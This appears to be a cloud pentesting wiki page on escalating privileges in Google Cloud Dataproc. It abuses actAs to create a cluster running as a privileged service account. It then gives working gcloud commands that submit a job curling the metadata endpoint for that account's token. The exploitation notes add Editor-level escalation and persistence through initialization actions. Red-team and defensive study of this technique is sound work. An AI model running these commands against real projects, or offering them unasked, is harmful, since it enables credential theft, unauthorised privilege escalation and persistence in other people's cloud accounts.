---
title: "Dataproc: actAs a service account through a cluster or job"
description: "Creating a Dataproc cluster or submitting a job that runs as the cluster's service account via actAs."
keywords:
  - Dataproc
  - cluster
  - job
  - actAs
  - service account
---

# Dataproc

Dataproc clusters run managed Spark and Hadoop, and cluster VMs run as a **service account**. With `dataproc.clusters.create` (plus `iam.serviceAccounts.actAs` on a privileged SA) you build a cluster bound to that account, then submit a job that reads its token or acts on its behalf.

## Create a cluster with a chosen service account

```bash
gcloud dataproc clusters create c1 --region us-central1 \
  --service-account <privileged-sa>@<proj>.iam.gserviceaccount.com

# submit a job that exfiltrates the cluster SA token
gcloud dataproc jobs submit pig --cluster c1 --region us-central1 \
  --execute "sh curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

## Exploitation notes

- Cluster nodes expose the metadata endpoint, so any job that can shell out reads the attached SA credentials.
- The default Dataproc SA is the Compute Engine default SA (Editor) unless overridden, a broad escalation.
- An initialization action on the cluster is a durable persistence hook that runs on every node boot.

## Tools

- **gcloud** (`dataproc clusters create`, `dataproc jobs submit`).

## References

- [GCP IAM privilege escalation (Rhino repo)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [HackTricks Cloud: GCP privilege escalation](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/index.html)
- [Google: Dataproc service accounts](https://cloud.google.com/dataproc/docs/concepts/configuring-clusters/service-accounts)
